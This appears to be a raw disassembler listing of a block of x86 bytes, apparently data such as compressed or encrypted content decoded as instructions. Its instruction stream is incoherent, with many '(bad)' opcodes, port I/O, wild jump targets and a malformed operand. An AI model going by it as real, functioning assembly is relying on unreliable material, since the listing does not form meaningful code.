  41b16a:	xchg   DWORD PTR [ebp+eax*1-0x53],ebx
  41b16e:	mov    bh,0xda
  41b170:	ret    0x9a03
  41b173:	or     bl,dl
  41b175:	in     eax,0x7a
  41b177:	sub    ch,bh
  41b179:	icebp  
  41b17a:	aam    0x7b
  41b17c:	cmp    DWORD PTR [edi-0x2d],ebp
  41b17f:	push   ds
  41b180:	cwde   
  41b181:	jp     0x41b18f
  41b183:	je     0x41b174
  41b185:	inc    eax
  41b186:	or     ebp,DWORD PTR [ebx]
  41b188:	and    esi,DWORD PTR [ecx+esi*8]
  41b18b:	pushf  
  41b18c:	fs jnp 0x41b12b
  41b18f:	(bad)  
  41b190:	jmp    0xcfd77557
  41b195:	loope  0x41b16f
  41b197:	jae    0x41b1ae
  41b199:	dec    edi
  41b19a:	xchg   esp,eax
  41b19b:	mov    ebp,DWORD PTR [edi-0x9]
  41b19e:	sbb    edi,DWORD PTR [edx]
  41b1a0:	loop   0x41b133
  41b1a2:	out    0xc1,al
  41b1a4:	sbb    edi,DWORD PTR [ebx]
  41b1a6:	lock ret 
  41b1a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1a9:	test   BYTE PTR [eax-0x4f],bl
  41b1ac:	inc    ecx
  41b1ad:	inc    ebx
  41b1ae:	push   esi
  41b1af:	cld    
  41b1b0:	and    cl,dl
  41b1b2:	pusha  
  41b1b3:	mov    edi,DWORD PTR [ecx+0x6]
  41b1b6:	jl     0x41b1bd
  41b1b8:	pop    ss
  41b1b9:	inc    esi
  41b1ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1bb:	out    0x6f,eax
  41b1bd:	sub    esi,DWORD PTR [esi+ebp*2]
  41b1c0:	(bad)  
  41b1c1:	stos   DWORD PTR es:[edi],eax
  41b1c2:	cmp    ch,cl
  41b1c4:	push   edx
  41b1c5:	mov    eax,0xec3a771
  41b1ca:	loop   0x41b1b0
  41b1cc:	dec    esp
  41b1cd:	test   eax,0xbb616d20
  41b1d2:	mov    esp,0xdde8b23
  41b1d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1d8:	sub    DWORD PTR [edx],edx
  41b1da:	rol    BYTE PTR [ebx+0x3],cl
  41b1dd:	nop
  41b1de:	mov    esi,0xafe429cb
  41b1e3:	mov    edx,0xb23bbaca
  41b1e8:	cld    
  41b1e9:	nop
  41b1ea:	fcomi  st,st(1)
  41b1ec:	jbe    0x41b201
  41b1ee:	or     DWORD PTR [eax],edi
  41b1f0:	or     al,0x45
  41b1f2:	pop    edi
  41b1f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1f4:	mov    ah,0xb9
  41b1f6:	aaa    
  41b1f7:	(bad)  
  41b1f8:	lahf   
  41b1f9:	fwait
  41b1fa:	xor    DWORD PTR [ebp+0x587326c5],0x6e10493d
  41b204:	dec    esi
  41b205:	sti    
  41b206:	aad    0x76
  41b208:	mov    esp,0x192d5c9f
  41b20d:	imul   eax,edi,0x63e0a0d3
  41b213:	retf   0x96a3
  41b216:	pmulhw mm5,QWORD PTR [ebp+eax*2-0x69]
  41b21b:	sub    DWORD PTR [edi-0x1a0f2ab7],0x24
  41b222:	xchg   edi,eax
  41b223:	jns    0x41b246
  41b225:	repnz or BYTE PTR [ebp+0x2cee6eeb],ch
  41b22c:	dec    edx
  41b22d:	jge    0x41b211
  41b22f:	test   DWORD PTR [ecx+edi*4-0x35],eax
  41b233:	out    dx,eax
  41b234:	sub    al,BYTE PTR [eax-0x34f19600]
  41b23a:	daa    
  41b23b:	addr16 push 0xa449ff30
	...
  41b2b1:	add    BYTE PTR [eax],al
  41b2b3:	add    bh,dh
  41b2b5:	pop    eax
  41b2b6:	test   al,0x13
  41b2b8:	scas   eax,DWORD PTR es:[edi]
  41b2b9:	repz (bad) 
  41b2bb:	cld    
  41b2bc:	cmp    ch,bh
  41b2be:	jl     0x41b2c7
  41b2c0:	les    edi,FWORD PTR [esi+edx*1+0x125ab43]
  41b2c7:	add    ch,dh
  41b2c9:	add    BYTE PTR [eax],al
  41b2cb:	add    ch,cl
  41b2cd:	mov    esi,0x52149579
  41b2d2:	lds    edx,FWORD PTR ds:0x734e7218
  41b2d8:	imul   ebp,DWORD PTR [ebp+0x67],0x6e3ca233
  41b2df:	into   
  41b2e0:	(bad)  
  41b2e1:	lock inc ecx
  41b2e3:	cmp    al,0xa5
  41b2e5:	and    al,0x6
  41b2e7:	mov    esp,gs
  41b2e9:	inc    eax
  41b2ea:	mov    cl,BYTE PTR [bx+si+0x6]
  41b2ee:	mov    dl,0xe7
  41b2f0:	add    dh,BYTE PTR [edx+0x631ca5a8]
  41b2f6:	jle    0x41b318
  41b2f8:	shr    BYTE PTR [edx-0x3d],cl
  41b2fb:	jo     0x41b2ab
  41b2fd:	xchg   edx,eax
  41b2fe:	and    al,0xcb
  41b300:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41b302:	sbb    eax,0xcf15a2b9
  41b307:	cmp    eax,0x4a836cd8
  41b30c:	push   ds
  41b30d:	mov    eax,ds:0x1cc1942f
  41b312:	jo     0x41b334
  41b314:	scas   al,BYTE PTR es:[edi]
  41b315:	pop    ss
  41b316:	retf   
  41b317:	mov    al,0x8d
  41b319:	dec    edi
  41b31a:	retf   0x2586
  41b31d:	or     eax,0x7f38e5ca
  41b322:	sub    DWORD PTR [eax-0x19],eax
  41b325:	push   edx
  41b326:	icebp  
  41b327:	sbb    ecx,ebp
  41b329:	loope  0x41b2ce
  41b32b:	mov    eax,ds:0x83cfb672
  41b330:	leave  
  41b331:	fstp   TBYTE PTR [edi]
  41b333:	cmp    DWORD PTR [eax-0x259ca702],0x5b
  41b33a:	lods   al,BYTE PTR ds:[esi]
  41b33b:	jl     0x41b36b
  41b33d:	mov    ah,BYTE PTR [ecx+0x4c]
  41b340:	ja     0x41b2ea
  41b342:	gs sbb ah,ch
  41b345:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b346:	sbb    ch,ah
  41b348:	retf   
  41b349:	out    dx,eax
  41b34a:	(bad)  
  41b34b:	int    0xdf
  41b34d:	mov    al,0x58
  41b34f:	test   al,0x8c
  41b351:	test   DWORD PTR [edi-0x37],ebp
  41b354:	xlat   BYTE PTR ds:[ebx]
  41b355:	addr16 sbb eax,0x554ed999
  41b35b:	add    DWORD PTR es:[esi+ebp*2+0x49],edx
  41b360:	and    eax,0x374d817
  41b365:	outs   dx,BYTE PTR ds:[esi]
  41b366:	call   0xcb75d67c
  41b36b:	inc    ecx
  41b36c:	add    edx,DWORD PTR [edx+eiz*4+0x3144b2a2]
  41b373:	adc    dh,BYTE PTR [ecx]
  41b375:	xchg   ecx,eax
  41b376:	stos   BYTE PTR es:[edi],al
  41b377:	out    dx,al
  41b378:	sub    al,0x9c
  41b37a:	lds    ebx,FWORD PTR [eax+0x5ee3c83d]
  41b380:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b381:	out    0x8a,al
  41b383:	call   0xc8cd:0x6e7543b5
  41b38a:	out    0x4f,al
  41b38c:	sub    DWORD PTR [edi],ebp
  41b38e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b38f:	mov    edx,0xfa2b61d6
  41b394:	xchg   eax,esp
  41b396:	ret    
  41b397:	ds mov esp,0xe11aeac4
  41b39d:	dec    ecx
  41b39e:	or     DWORD PTR [edi],edi
  41b3a0:	add    cl,BYTE PTR [esi+0x418e91c9]
  41b3a6:	cvtps2pi mm5,QWORD PTR [edi+0xa]
  41b3aa:	cmp    bh,0x5
  41b3ad:	push   esi
  41b3ae:	adc    BYTE PTR [edx],ch
  41b3b0:	cmp    dl,0xfe
  41b3b3:	fidiv  DWORD PTR [eax-0x75ab70a2]
  41b3b9:	push   ecx
  41b3ba:	aas    
  41b3bb:	cli    
  41b3bc:	sub    ebx,ebx
  41b3be:	lods   eax,DWORD PTR ds:[esi]
  41b3bf:	or     BYTE PTR ss:[eax],al
	...
  41b432:	add    BYTE PTR [eax],al
  41b434:	mov    edi,0xff0fcf82
  41b439:	dec    edi
  41b43a:	push   DWORD PTR [edx-0x33ef3aa9]
  41b440:	add    al,0xde
  41b442:	and    al,0xe1
  41b444:	mov    al,ds:0xf5000126
  41b449:	add    BYTE PTR [eax],al
  41b44b:	add    BYTE PTR [edx-0x11],cl
  41b44e:	or     BYTE PTR [ebp-0x66],dh
  41b451:	bound  esp,QWORD PTR [ebp-0x6a0f6a71]
  41b457:	mov    al,0x40
  41b459:	fistp  QWORD PTR [edx-0x3da5f947]
  41b45f:	leave  
  41b460:	sub    BYTE PTR [esp+eax*2],0x5c
  41b464:	rol    DWORD PTR [edi+ebx*8+0x495f3d24],cl
  41b46b:	sahf   
  41b46c:	sub    ch,BYTE PTR [edi]
  41b46e:	mov    eax,ds:0x95f52e59
  41b473:	retf   
  41b474:	sub    esi,edi
  41b476:	xchg   ebx,eax
  41b477:	inc    ebp
  41b478:	pop    esi
  41b479:	mov    ch,0xae
  41b47b:	mov    al,ds:0x8135961
  41b480:	sub    bl,ch
  41b482:	(bad)  
  41b483:	test   DWORD PTR ds:[esp+ecx*8-0x6],eax
  41b488:	(bad)
  41b48c:	(bad)  [ebp-0x6f]
  41b48f:	test   eax,0x798f64f7
  41b494:	xor    BYTE PTR [ebx+0x8],ah
  41b497:	mov    al,ds:0xf3238fbb
  41b49c:	adc    DWORD PTR [ebx+esi*8-0x14aa4357],esp
  41b4a3:	push   0x4f1d9e1d
  41b4a8:	into   
  41b4a9:	or     DWORD PTR [eax+esi*1+0x19d0ec9d],0xa8a4e825
  41b4b4:	rcr    DWORD PTR [edi],cl
  41b4b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4b7:	ja     0x41b43b
  41b4b9:	push   eax
  41b4ba:	call   0x8a3b36f5
  41b4bf:	rcl    DWORD PTR [ecx-0x6ec3d723],1
  41b4c5:	loope  0x41b48a
  41b4c7:	or     DWORD PTR [edi-0x2d],ebx
  41b4ca:	and    al,0xb5
  41b4cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4cd:	push   0xfffffffd
  41b4cf:	sub    BYTE PTR [edi-0x1b],al
  41b4d2:	shl    dh,1
  41b4d4:	outs   dx,BYTE PTR ds:[esi]
  41b4d5:	pop    ebx
  41b4d6:	xchg   ebx,eax
  41b4d7:	ror    BYTE PTR [ecx+edi*8-0x2caf6b52],0x53
  41b4df:	or     esp,DWORD PTR [eax]
  41b4e1:	fistp  QWORD PTR [ecx-0x26a3e31d]
  41b4e7:	out    dx,al
  41b4e8:	lahf   
  41b4e9:	adc    BYTE PTR [edi-0x14],al
  41b4ec:	out    dx,al
  41b4ed:	cmc    
  41b4ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4ef:	mov    bl,0x57
  41b4f1:	mov    dh,0xad
  41b4f3:	adc    bl,BYTE PTR [ebp+0x5]
  41b4f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4f7:	push   ebx
  41b4f8:	fnstenv [ebx+0x1d]
  41b4fb:	add    al,0x9c
  41b4fd:	cmp    eax,0x6fd568c4
  41b502:	ret    
  41b503:	mov    esp,ebp
  41b505:	ror    BYTE PTR [eax+0x6d],0x12
  41b509:	and    ah,al
  41b50b:	js     0x41b514
  41b50d:	lds    ebx,FWORD PTR [edi]
  41b50f:	les    esp,FWORD PTR [ecx+0x18636e76]
  41b515:	inc    ebp
  41b516:	xchg   esp,eax
  41b517:	sti    
  41b518:	lds    eax,FWORD PTR [edi+0x1d]
  41b51b:	aam    0xa6
  41b51d:	lea    ebx,[esi]
  41b51f:	mov    WORD PTR [ebp-0x6b045f72],gs
  41b525:	dec    esp
  41b526:	loop   0x41b524
  41b528:	or     esi,DWORD PTR [edx]
  41b52a:	mov    ds,WORD PTR [esi]
  41b52c:	out    dx,eax
  41b52d:	xor    DWORD PTR [ebx+0x3a],eax
  41b530:	mov    al,0x5f
  41b532:	jle    0x41b594
  41b534:	add    ch,bl
  41b536:	stos   BYTE PTR es:[edi],al
  41b537:	call   0x2511:0x579329da
  41b53e:	or     al,0x1d
  41b540:	add    DWORD PTR [eax],0x0
	...
  41b5b2:	add    BYTE PTR [eax],al
  41b5b4:	pop    esp
  41b5b5:	sub    al,BYTE PTR [ecx]
  41b5b7:	inc    ecx
  41b5b8:	ja     0x41b625
  41b5ba:	pop    esp
  41b5bb:	aas    
  41b5bc:	pop    ecx
  41b5bd:	pop    esi
  41b5be:	inc    eax
  41b5bf:	adc    al,0xee
  41b5c1:	ds scas eax,DWORD PTR es:[edi]
  41b5c3:	dec    ebx
  41b5c4:	xchg   ebp,eax
  41b5c5:	daa    
  41b5c6:	add    DWORD PTR [eax],eax
  41b5c8:	cmc    
  41b5c9:	add    BYTE PTR [eax],al
  41b5cb:	add    dl,bh
  41b5cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5ce:	out    0x6,eax
  41b5d0:	push   ds
  41b5d1:	arpl   WORD PTR [edx+eiz*1+0x43],cx
  41b5d5:	xchg   ebp,eax
  41b5d6:	jge    0x41b5cb
  41b5d8:	scas   eax,DWORD PTR es:[edi]
  41b5d9:	aas    
  41b5da:	xor    ah,BYTE PTR [ecx]
  41b5dc:	ins    DWORD PTR es:[edi],dx
  41b5dd:	out    dx,eax
  41b5de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5df:	mov    bh,0x6c
  41b5e1:	push   es
  41b5e2:	(bad)  
  41b5e3:	out    0x34,eax
  41b5e5:	xchg   ebp,eax
  41b5e6:	in     eax,dx
  41b5e7:	push   ds
  41b5e8:	or     BYTE PTR [ebx+0x1eb427a7],al
  41b5ee:	mov    esp,DWORD PTR [esi+0x39]
  41b5f1:	arpl   WORD PTR ss:[edx-0xa],sp
  41b5f5:	aam    0x29
  41b5f7:	pop    edx
  41b5f8:	ss retf 
  41b5fa:	lds    esp,FWORD PTR [ebx]
  41b5fc:	jecxz  0x41b601
  41b5fe:	int    0xee
  41b600:	pop    edi
  41b601:	mov    edi,0x76c4f32
  41b606:	mov    ?,WORD PTR [eax-0x29]
  41b609:	xchg   esp,eax
  41b60a:	xlat   BYTE PTR ds:[ebx]
  41b60b:	mov    ebp,0x97b8b79c
  41b610:	cmp    BYTE PTR [esi-0x60],cl
  41b613:	das    
  41b614:	in     al,0xb
  41b616:	sbb    DWORD PTR [ebx+0x76],ebx
  41b619:	jge    0x41b5ae
  41b61b:	sub    al,0xa0
  41b61d:	out    dx,al
  41b61e:	or     edi,ecx
  41b620:	jne    0x41b61a
  41b622:	outs   dx,BYTE PTR ds:[esi]
  41b623:	stos   BYTE PTR es:[edi],al
  41b624:	sahf   
  41b625:	xchg   edi,eax
  41b626:	jecxz  0x41b674
  41b628:	leave  
  41b629:	jbe    0x41b688
  41b62b:	push   cs
  41b62c:	js     0x41b61c
  41b62e:	pop    edi
  41b62f:	mov    bl,0x64
  41b631:	pop    esi
  41b632:	ja     0x41b6a4
  41b634:	daa    
  41b635:	ret    0x6536
  41b638:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b639:	xchg   edi,eax
  41b63a:	sub    edx,DWORD PTR [edx-0x2b]
  41b63d:	scas   al,BYTE PTR es:[edi]
  41b63e:	lods   al,BYTE PTR ds:[esi]
  41b63f:	pop    es
  41b640:	mov    dl,0x48
  41b642:	jnp    0x41b69f
  41b644:	ja     0x41b696
  41b646:	xor    eax,0x5e01314b
  41b64b:	sub    DWORD PTR [ebp+eax*4-0x1e9fc2d],edx
  41b652:	jge    0x41b634
  41b654:	sub    ebp,DWORD PTR [ebx-0x711ad85e]
  41b65a:	test   BYTE PTR [ecx+0x68bfdce4],al
  41b660:	pop    edx
  41b661:	loop   0x41b6ca
  41b663:	sub    bh,BYTE PTR [edi]
  41b665:	push   edi
  41b666:	pop    ecx
  41b667:	inc    esi
  41b668:	aad    0x1c
  41b66a:	in     al,dx
  41b66b:	out    dx,al
  41b66c:	adc    edi,edx
  41b66e:	pop    ebp
  41b66f:	popf   
  41b670:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b671:	(bad)  
  41b672:	xchg   ebp,eax
  41b673:	cmp    eax,0x3081f54c
  41b678:	outs   dx,DWORD PTR ds:[esi]
  41b679:	aad    0x7b
  41b67b:	sbb    DWORD PTR [ecx+0x73e28488],ebx
  41b681:	rol    al,0x3f
  41b684:	xor    ah,dh
  41b686:	add    eax,ebx
  41b688:	jnp    0x41b6bd
  41b68a:	and    ch,bl
  41b68c:	push   0xffffffa1
  41b68e:	adc    dl,ch
  41b690:	mov    eax,0x471616ae
  41b695:	test   DWORD PTR [ebp-0x1364d0ab],0x8affd852
  41b69f:	test   eax,0x591dd803
  41b6a4:	jae    0x41b710
  41b6a6:	sti    
  41b6a7:	sub    ebx,eax
  41b6a9:	pop    ecx
  41b6aa:	lea    edi,[eax+0x81c4ab4]
  41b6b0:	sub    eax,0xc15da392
  41b6b5:	xor    DWORD PTR [esi+0x5dc0f504],0xbc459554
  41b6bf:	pop    edi
  41b6c0:	or     BYTE PTR [eax],al
	...
  41b732:	add    BYTE PTR [eax],al
  41b734:	repz xchg edi,eax
  41b736:	jae    0x41b6bf
  41b738:	ja     0x41b721
  41b73a:	div    edi
  41b73c:	dec    eax
  41b73d:	lods   eax,DWORD PTR ds:[esi]
  41b73e:	push   es
  41b73f:	mov    BYTE PTR [edi-0x5e],al
  41b742:	cmp    ebp,ebx
  41b744:	mov    ch,BYTE PTR [eax]
  41b746:	add    DWORD PTR [eax],eax
  41b748:	cmc    
  41b749:	add    BYTE PTR [eax],al
  41b74b:	add    BYTE PTR [edi-0x21],bl
  41b74e:	loope  0x41b787
  41b750:	lds    esp,FWORD PTR [edi]
  41b752:	cs nop
  41b754:	jb     0x41b7d0
  41b756:	nop
  41b757:	loop   0x41b748
  41b759:	dec    edi
  41b75a:	shr    edx,0xcd
  41b75d:	xor    BYTE PTR [esi],bh
  41b75f:	mov    ebx,0x3f92982f
  41b764:	add    al,0xa9
  41b766:	rcl    DWORD PTR [edi-0x5b],cl
  41b769:	mov    eax,ds:0x9e36c5ed
  41b76e:	add    eax,0xa962b83a
  41b773:	mov    bl,0xf3
  41b775:	xchg   ebx,eax
  41b776:	pop    ss
  41b777:	(bad)  
  41b778:	cmp    dh,BYTE PTR [edx+0xd]
  41b77b:	sub    BYTE PTR [esi+0x573769d9],ch
  41b781:	out    0xfa,al
  41b783:	stos   BYTE PTR es:[edi],al
  41b784:	mov    dh,0xf5
  41b786:	scas   eax,DWORD PTR es:[edi]
  41b787:	std    
  41b788:	pushf  
  41b789:	add    DWORD PTR [eax+0x4],ebp
  41b78c:	or     BYTE PTR [edi+0x1138de94],bh
  41b792:	mov    esi,0x53afc386
  41b797:	jmp    0x41b740
  41b799:	inc    ebp
  41b79a:	cdq    
  41b79b:	arpl   WORD PTR [ebx+0x1ad40cab],bp
  41b7a1:	mov    esi,0x2d8945c4
  41b7a6:	or     eax,0xe0b83a05
  41b7ab:	sub    ebx,edi
  41b7ad:	js     0x41b7d6
  41b7af:	cwde   
  41b7b0:	lds    esi,FWORD PTR fs:[edx]
  41b7b3:	xchg   edx,eax
  41b7b4:	cmc    
  41b7b5:	lea    eax,[ecx]
  41b7b7:	js     0x41b749
  41b7b9:	lds    esp,FWORD PTR [esi+0x2d65d477]
  41b7bf:	adc    DWORD PTR [edx+0x5f],edx
  41b7c2:	ret    0x9954
  41b7c5:	xor    DWORD PTR [ecx-0x57ee2367],0x48
  41b7cc:	pop    ecx
  41b7cd:	mov    edx,0xfee96c10
  41b7d2:	in     eax,0x68
  41b7d4:	mov    cl,0xd
  41b7d6:	lods   eax,DWORD PTR ds:[esi]
  41b7d7:	inc    esi
  41b7d8:	outs   dx,DWORD PTR ds:[esi]
  41b7d9:	fwait
  41b7da:	hlt    
  41b7db:	arpl   WORD PTR [eax],sp
  41b7dd:	xchg   esp,eax
  41b7de:	or     BYTE PTR [ebx-0x4],ah
  41b7e1:	adc    DWORD PTR [ecx-0x326c93f5],ebx
  41b7e7:	mov    ds:0xe6484da2,al
  41b7ec:	in     al,0x88
  41b7ee:	(bad)  
  41b7ef:	jmp    0xf6302e18
  41b7f4:	or     edi,DWORD PTR [ebx+ebp*2]
  41b7f7:	mov    eax,ds:0xb3d9a6a4
  41b7fc:	out    dx,eax
  41b7fd:	or     DWORD PTR [edx+0x2f],esp
  41b800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b801:	mov    esp,0x8fa71bf
  41b806:	adc    BYTE PTR [esi],ch
  41b808:	add    eax,0xa89f4b2e
  41b80d:	dec    ebx
  41b80e:	xchg   DWORD PTR [edx],eax
  41b810:	out    dx,al
  41b811:	pusha  
  41b812:	das    
  41b813:	dec    ebx
  41b814:	int    0x63
  41b816:	ss xchg ebx,eax
  41b818:	dec    esi
  41b819:	pop    ecx
  41b81a:	dec    ebx
  41b81b:	cli    
  41b81c:	adc    BYTE PTR [esp+ebx*1],ch
  41b81f:	jp     0x41b7c3
  41b821:	imul   ebx,DWORD PTR [ecx+0x73],0x39
  41b825:	pop    eax
  41b826:	mov    ecx,0x6ec6d62f
  41b82b:	in     eax,0xee
  41b82d:	push   esp
  41b82e:	sub    eax,0xa3b98f85
  41b833:	xchg   DWORD PTR [edi],ebp
  41b835:	push   0x24a80158
  41b83a:	daa    
  41b83b:	jno    0x41b873
  41b83d:	xchg   edx,eax
  41b83e:	jg     0x41b899
  41b840:	push   es
	...
  41b8b1:	add    BYTE PTR [eax],al
  41b8b3:	add    BYTE PTR ds:0xcf4a867e,dh
  41b8b9:	cli    
  41b8ba:	std    
  41b8bb:	jg     0x41b85c
  41b8bd:	into   
  41b8be:	jno    0x41b916
  41b8c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8c1:	xchg   esp,eax
  41b8c2:	jp     0x41b8eb
  41b8c4:	jg     0x41b8ef
  41b8c6:	add    DWORD PTR [eax],eax
  41b8c8:	cmc    
  41b8c9:	add    BYTE PTR [eax],al
  41b8cb:	add    BYTE PTR [edi+0x4],bl
  41b8ce:	cmp    DWORD PTR [esi+0x14d02f45],0xf978dfc7
  41b8d8:	xor    BYTE PTR [ebx],al
  41b8da:	add    al,0x34
  41b8dc:	repz and DWORD PTR [ebx+ecx*1],0x7
  41b8e1:	mov    DWORD PTR [edx-0x618588d3],ebx
  41b8e7:	dec    eax
  41b8e8:	add    eax,DWORD PTR [ecx]
  41b8ea:	sbb    BYTE PTR [edi],al
  41b8ec:	scas   eax,DWORD PTR es:[edi]
  41b8ed:	dec    ebp
  41b8ee:	cmp    eax,DWORD PTR [ebx+0x72c2b8a1]
  41b8f4:	pop    ecx
  41b8f5:	push   cs
  41b8f6:	sbb    eax,0x74da8d66
  41b8fb:	push   cs
  41b8fc:	push   ecx
  41b8fd:	cld    
  41b8fe:	imul   esi,DWORD PTR [esi+0x1ff52d28],0xffffffbc
  41b905:	mov    bl,BYTE PTR [eax+esi*8+0x50]
  41b909:	jns    0x41b932
  41b90b:	rcl    DWORD PTR [ebx-0x18],cl
  41b90e:	fild   WORD PTR [edi+0x2f291068]
  41b914:	lods   eax,DWORD PTR ds:[esi]
  41b915:	aad    0x2f
  41b917:	mov    dh,0xf6
  41b919:	or     al,BYTE PTR [ebp+0x6e]
  41b91c:	lods   eax,DWORD PTR ds:[esi]
  41b91d:	mov    edi,0x35c6f618
  41b922:	arpl   WORD PTR [edx+0x1d985a2c],bx
  41b928:	into   
  41b929:	or     ch,0x78
  41b92c:	ss mov edx,0x57b5ded8
  41b932:	pushf  
  41b933:	rol    BYTE PTR [eax],0xe4
  41b936:	daa    
  41b937:	sti    
  41b938:	ffreep st(3)
  41b93a:	lods   eax,DWORD PTR ds:[esi]
  41b93b:	cwde   
  41b93c:	rol    DWORD PTR fs:[esi-0xa490d11],cl
  41b943:	hlt    
  41b944:	test   BYTE PTR [ebx+0x1cc5c1c7],al
  41b94a:	es mov eax,0x8b166049
  41b950:	and    BYTE PTR [ecx-0x71f679b6],bh
  41b956:	lds    edi,FWORD PTR [eax+0xf2da015]
  41b95c:	push   ecx
  41b95d:	mov    ebx,0xdc83769
  41b962:	cmp    ch,BYTE PTR [esi+0x4d]
  41b965:	cdq    
  41b966:	adc    ebp,edi
  41b968:	out    dx,eax
  41b969:	addr16 popf 
  41b96b:	pop    ebx
  41b96c:	pushf  
  41b96d:	imul   DWORD PTR [eax+0x63]
  41b970:	mov    ebx,0x8037609c
  41b975:	frstor [edx-0x86043d]
  41b97b:	inc    esi
  41b97c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b97d:	repz imul eax,DWORD PTR [ecx],0xffffffb5
  41b981:	xor    al,0x9e
  41b983:	lods   al,BYTE PTR ds:[esi]
  41b984:	xchg   DWORD PTR [eax-0x2465e46f],ecx
  41b98a:	mov    ah,0xda
  41b98c:	loopne 0x41b970
  41b98e:	mov    bl,0x76
  41b990:	push   esp
  41b991:	scas   al,BYTE PTR es:[edi]
  41b992:	or     BYTE PTR [ecx+0x194bdff0],cl
  41b998:	pop    ebp
  41b999:	das    
  41b99a:	jg     0x41ba06
  41b99c:	mov    ch,0xe9
  41b99e:	out    0x80,al
  41b9a0:	shl    ebp,cl
  41b9a2:	push   esi
  41b9a3:	add    DWORD PTR [edx],edi
  41b9a5:	jge    0x41b94b
  41b9a7:	lods   al,BYTE PTR ds:[esi]
  41b9a8:	sbb    ah,BYTE PTR [ecx-0x3c]
  41b9ab:	sub    DWORD PTR [ecx-0x1e],0x44
  41b9af:	add    BYTE PTR [ecx],0x91
  41b9b2:	rcl    BYTE PTR [edx],cl
  41b9b4:	dec    edi
  41b9b5:	cmp    bh,BYTE PTR [ecx]
  41b9b7:	in     al,dx
  41b9b8:	add    edx,edx
  41b9ba:	scas   eax,DWORD PTR es:[edi]
  41b9bb:	sub    BYTE PTR [eax-0x23],0x23
  41b9bf:	jo     0x41b99b
	...
  41ba31:	add    BYTE PTR [eax],al
  41ba33:	add    bh,dh
  41ba35:	add    esp,ebx
  41ba37:	mov    ah,0xfe
  41ba39:	std    
  41ba3a:	inc    DWORD PTR [ebx-0x11]
  41ba3d:	sub    ecx,DWORD PTR [edx]
  41ba3f:	pop    edi
  41ba40:	push   esi
  41ba41:	(bad)  
  41ba42:	adc    ah,dh
  41ba44:	je     0x41ba70
  41ba46:	add    DWORD PTR [eax],eax
  41ba48:	cmc    
  41ba49:	add    BYTE PTR [eax],al
  41ba4b:	add    BYTE PTR [esi],al
  41ba4d:	addr16 jno 0x41baa9
  41ba50:	xchg   ebx,eax
  41ba51:	pushf  
  41ba52:	push   ebx
  41ba53:	dec    edi
  41ba54:	xchg   BYTE PTR ds:[ecx],al
  41ba57:	jl     0x41bab2
  41ba59:	sub    al,BYTE PTR [esi*4+0x7e9f4717]
  41ba60:	aam    0x20
  41ba62:	mov    DWORD PTR [ebp+0x6d],edx
  41ba65:	jl     0x41baa1
  41ba67:	or     dl,BYTE PTR [esi]
  41ba69:	xchg   esp,eax
  41ba6a:	jbe    0x41ba19
  41ba6c:	mov    ah,0x1c
  41ba6e:	jns    0x41ba95
  41ba70:	loope  0x41bac9
  41ba72:	jecxz  0x41baa0
  41ba74:	mov    al,ds:0xb6a6d0d7
  41ba79:	cmp    eax,0xbda85c14
  41ba7e:	dec    eax
  41ba7f:	cmp    eax,0x96e1edec
  41ba84:	(bad)  
  41ba85:	mov    bl,0x46
  41ba87:	fdiv   st,st(7)
  41ba89:	cmp    BYTE PTR [edi+esi*2+0x22d2e467],bh
  41ba90:	sbb    ecx,ebx
  41ba92:	fidivr WORD PTR ds:0x495f62b6
  41ba98:	pop    ecx
  41ba99:	mov    cl,0x5e
  41ba9b:	adc    DWORD PTR [ecx-0x1c937573],edx
  41baa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baa2:	clc    
  41baa3:	sub    eax,0x493d54cd
  41baa8:	call   0x6b20c617
  41baad:	adc    ecx,edi
  41baaf:	retf   
  41bab0:	fiadd  DWORD PTR [esi+0x40ddd6a0]
  41bab6:	jmp    0x41bace
  41bab8:	push   es
  41bab9:	sub    DWORD PTR [edi-0x6edde5be],ebp
  41babf:	dec    eax
  41bac0:	dec    eax
  41bac1:	repnz loope 0x41ba83
  41bac4:	mov    bl,ch
  41bac6:	scas   al,BYTE PTR es:[edi]
  41bac7:	jp     0x41bb0f
  41bac9:	maskmovq mm1,(bad)
  41baca:	test   DWORD PTR [edx-0xb5421a0],0x4f198fa5
  41bad4:	ins    BYTE PTR es:[edi],dx
  41bad5:	mov    esi,0x6635cffd
  41bada:	mov    bl,0x26
  41badc:	mov    bl,0x8e
  41bade:	or     DWORD PTR [ebx-0x377b6d4f],0x86bf3c1e
  41bae8:	push   DWORD PTR ds:0x848d4c9f
  41baee:	ins    BYTE PTR es:[edi],dx
  41baef:	jl     0x41bb4e
  41baf1:	gs retf 0x957a
  41baf5:	dec    ebx
  41baf6:	ret    0x3031
  41baf9:	add    ah,cl
  41bafb:	call   0x9abcc6b4
  41bb00:	xor    ebp,DWORD PTR [edi-0x55]
  41bb03:	pop    esi
  41bb04:	pop    ds
  41bb05:	stos   DWORD PTR es:[edi],eax
  41bb06:	cdq    
  41bb07:	sbb    al,0x97
  41bb09:	xchg   ebp,eax
  41bb0a:	xchg   ah,dl
  41bb0c:	jne    0x41bafe
  41bb0e:	stc    
  41bb0f:	arpl   WORD PTR [esi-0x265be566],di
  41bb15:	pop    ds
  41bb16:	(bad)  
  41bb17:	push   eax
  41bb18:	jo     0x41bb74
  41bb1a:	xor    edx,0xffffffc6
